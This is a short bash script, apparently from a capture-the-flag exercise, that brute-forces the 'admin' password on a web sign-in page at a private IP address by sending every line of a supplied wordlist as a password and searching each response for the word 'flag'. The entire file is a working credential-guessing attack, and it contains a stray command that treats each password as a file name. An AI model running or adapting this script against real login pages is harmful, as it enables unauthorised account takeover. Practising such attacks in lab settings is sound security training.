#!/bin/bash
while IFS='' read -r line || [[ -n "$line" ]]; do
	curl "172.16.0.128/?page=signin&username=admin&password=$line&Login=Login" | grep flag ; cat $line
done < "$1"
